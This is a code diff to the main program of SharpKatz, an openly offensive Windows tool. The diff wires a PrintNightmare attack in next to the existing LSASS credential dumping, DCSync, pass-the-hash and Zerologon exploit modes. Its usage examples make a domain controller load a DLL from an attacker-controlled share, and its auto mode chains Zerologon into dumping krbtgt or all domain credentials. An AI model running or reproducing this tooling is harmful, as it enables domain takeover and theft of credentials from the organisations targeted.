@@ -44,11 +44,12 @@ namespace SharpKatz
             string target = null;
             string machineaccount = null;
             string nullsessionStr = null;
+            string library = null;
             bool showhelp = false;
 
             OptionSet opts = new OptionSet()
             {
-                { "Command=", "--Command logonpasswords,ekeys,msv,kerberos,tspkg,credman,wdigest,dcsync", v => command = v },
+                { "Command=", "--Command logonpasswords,ekeys,msv,kerberos,tspkg,credman,wdigest,dcsync,zerologon,printnightmare", v => command = v },
                 { "User=", "--User [user]", v => user = v },
                 { "Guid=", "--Guid [guid]", v => guid = v },
                 { "Domain=", "--Domain [domain]", v => domain = v },
@@ -74,6 +75,8 @@ namespace SharpKatz
                 { "AuthPassword=", "--AuthPassword [authpassword]", v => authpassword = v },
                 { "ForceNtlm=", "--ForceNtlm [forcentlm]", v => forcentlmStr = v },
 
+                { "Library=", "--Library [library]", v => library = v },
+
                 { "Altservice=", "--Altservice [alternative service]", v => altservice = v },
                 { "h|?|help",  "Show available options", v => showhelp = v != null },
             };
@@ -90,7 +93,7 @@ namespace SharpKatz
             bool impersonate = false;
             try
             {
-                if(!string.IsNullOrEmpty(impersonateStr))
+                if (!string.IsNullOrEmpty(impersonateStr))
                     impersonate = bool.Parse(impersonateStr);
             }
             catch (OptionException e)
@@ -141,15 +144,17 @@ namespace SharpKatz
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command zerologon --Mode check --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$");
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command zerologon --Mode exploit --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$");
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --User krbtgt --DomainController WIN-NSE5CPCP07C.testlab2.local");
-
+                Console.WriteLine("[*] Example: SharpKatz.exe --Command printnightmare --DomainController dc --Library \\\\mycontrolled\\share\\fun.dll");
+                Console.WriteLine("[*] Example: SharpKatz.exe --Command printnightmare --DomainController dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom");
                 return;
             }
-                        
+
             if (string.IsNullOrEmpty(command))
                 command = "logonpasswords";
 
             if (!command.Equals("logonpasswords") && !command.Equals("msv") && !command.Equals("kerberos") && !command.Equals("credman") &&
-                !command.Equals("tspkg") && !command.Equals("wdigest") && !command.Equals("ekeys") && !command.Equals("dcsync") && !command.Equals("pth") && !command.Equals("zerologon"))
+                !command.Equals("tspkg") && !command.Equals("wdigest") && !command.Equals("ekeys") && !command.Equals("dcsync") &&
+                !command.Equals("pth") && !command.Equals("zerologon") && !command.Equals("printnightmare")) 
             {
                 Console.WriteLine("Unknown command");
                 return;
@@ -170,9 +175,9 @@ namespace SharpKatz
                 return;
             }
 
-            if (!command.Equals("dcsync") && !command.Equals("zerologon"))
+            if (!command.Equals("dcsync") && !command.Equals("zerologon") && !command.Equals("printnightmare"))
             {
-                
+
                 if (!Utility.IsElevated())
                 {
                     Console.WriteLine("Run in High integrity context");
@@ -225,7 +230,7 @@ namespace SharpKatz
                 }
 
                 hProcess = Natives.OpenProcess(Natives.ProcessAccessFlags.All, false, plsass.Id);
-                
+
                 Keys keys = new Keys(hProcess, lsasrv, osHelper);
 
                 if (command.Equals("pth"))
@@ -269,7 +274,7 @@ namespace SharpKatz
                     Utility.PrintLogonList(logonlist);
                 }
 
-                
+
             }
             else
             {
@@ -306,93 +311,110 @@ namespace SharpKatz
                 }
                 else
                 {
-
-                    if (string.IsNullOrEmpty(mode) || (!mode.Equals("check") && !mode.Equals("exploit") && !mode.Equals("auto")))
+                    if (command.Equals("zerologon"))
                     {
-                        Console.WriteLine("[x] Missing or incorrect required parameter -> Mode");
-                        return;
-                    }
-                    else if(mode.Equals("auto") && (string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(dc)))
-                    {
-                        Console.WriteLine("[x] Missing required parameter -> Domain or DomainController");
-                        return;
-                    }
-                    if (string.IsNullOrEmpty(target))
-                    {
-                        Console.WriteLine("[x] Missing or incorrect required parameter -> Target");
-                        return;
-                    }
-
-                    if (string.IsNullOrEmpty(machineaccount))
-                    {
-                        Console.WriteLine("[x] Missing or incorrect required parameter -> MachineAccount");
-                        return;
-                    }
-
-                    int authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;
-
-                    if (!string.IsNullOrEmpty(auth))
-                    {
-                        switch(auth)
+                        if (string.IsNullOrEmpty(mode) || (!mode.Equals("check") && !mode.Equals("exploit") && !mode.Equals("auto")))
                         {
-                            case "noauth":
-                                authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;
-                                break;
-                            case "ntlm":
-                                authnSvc = Module.DCSync.RPC_C_AUTHN_WINNT;
-                                break;
-                            case "kerberos":
-                                authnSvc = Module.DCSync.RPC_C_AUTHN_GSS_KERBEROS;
-                                break;
-                            case "negotiate":
-                                authnSvc = Module.DCSync.RPC_C_AUTHN_GSS_NEGOTIATE;
-                                break;
-                            default:
-                                Console.WriteLine("[!] Invalid Auth parameter value, use default -> AUTHN_NONE");
-                                authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;
-                                break;
+                            Console.WriteLine("[x] Missing or incorrect required parameter -> Mode");
+                            return;
                         }
-                    }
-
-                    bool success = Module.Zerologon.RunZerologon(mode,target,machineaccount, authnSvc, nullsession);
-
-                    if (success == true)
-                    {
-                        
-                        Console.WriteLine("[*]");
-
-                        if(mode.Equals("auto"))
+                        else if (mode.Equals("auto") && (string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(dc)))
                         {
-                            Console.WriteLine("[!] {0} will be the domain", domain);
-                            Console.WriteLine("[!] {0} will be the DC server", dc);
+                            Console.WriteLine("[x] Missing required parameter -> Domain or DomainController");
+                            return;
+                        }
+                        if (string.IsNullOrEmpty(target))
+                        {
+                            Console.WriteLine("[x] Missing or incorrect required parameter -> Target");
+                            return;
+                        }
 
-                            if (!string.IsNullOrEmpty(guid))
+                        if (string.IsNullOrEmpty(machineaccount))
+                        {
+                            Console.WriteLine("[x] Missing or incorrect required parameter -> MachineAccount");
+                            return;
+                        }
+
+                        int authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;
+
+                        if (!string.IsNullOrEmpty(auth))
+                        {
+                            switch (auth)
                             {
-                                Console.WriteLine("[!] {0} will be the Guid", guid);
-                                Module.DCSync.FinCredential(domain, dc, guid: guid, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true);
-                            }
-                            else if (!string.IsNullOrEmpty(user))
-                            {
-                                Console.WriteLine("[!] {0} will be the user account", user);
-                                Module.DCSync.FinCredential(domain, dc, user: user, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true);
-                            }
-                            else
-                            {
-                                Module.DCSync.FinCredential(domain, dc, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true, alldata: true);
+                                case "noauth":
+                                    authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;
+                                    break;
+                                case "ntlm":
+                                    authnSvc = Module.DCSync.RPC_C_AUTHN_WINNT;
+                                    break;
+                                case "kerberos":
+                                    authnSvc = Module.DCSync.RPC_C_AUTHN_GSS_KERBEROS;
+                                    break;
+                                case "negotiate":
+                                    authnSvc = Module.DCSync.RPC_C_AUTHN_GSS_NEGOTIATE;
+                                    break;
+                                default:
+                                    Console.WriteLine("[!] Invalid Auth parameter value, use default -> AUTHN_NONE");
+                                    authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;
+                                    break;
                             }
                         }
+
+                        bool success = Module.Zerologon.RunZerologon(mode, target, machineaccount, authnSvc, nullsession);
+
+                        if (success == true)
+                        {
+
+                            Console.WriteLine("[*]");
+
+                            if (mode.Equals("auto"))
+                            {
+                                Console.WriteLine("[!] {0} will be the domain", domain);
+                                Console.WriteLine("[!] {0} will be the DC server", dc);
+
+                                if (!string.IsNullOrEmpty(guid))
+                                {
+                                    Console.WriteLine("[!] {0} will be the Guid", guid);
+                                    Module.DCSync.FinCredential(domain, dc, guid: guid, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true);
+                                }
+                                else if (!string.IsNullOrEmpty(user))
+                                {
+                                    Console.WriteLine("[!] {0} will be the user account", user);
+                                    Module.DCSync.FinCredential(domain, dc, user: user, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true);
+                                }
+                                else
+                                {
+                                    Module.DCSync.FinCredential(domain, dc, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true, alldata: true);
+                                }
+                            }
+
+                        }
+                        else
+                            Console.WriteLine("[x] Attack failed. Target is probably patched.");
 
                     }
                     else
-                        Console.WriteLine("[x] Attack failed. Target is probably patched.");
+                    {
+                        if (string.IsNullOrEmpty(library))
+                        {
+                            Console.WriteLine("[x] Missing or incorrect required parameter -> Library");
+                            return;
+                        }
 
+                        if (string.IsNullOrEmpty(dc))
+                        {
+                            Console.WriteLine("[x] Missing or incorrect required parameter -> DomainController");
+                            return;
+                        }
+
+                        Module.PrintNightmare.RunPrintNightmare(dc,library, authuser: authuser, authdomain: authdomain, authpassword: authpassword);
+                    }
                 }
-                
-                
+
             }
         }
 
-        
+
 
 
     }
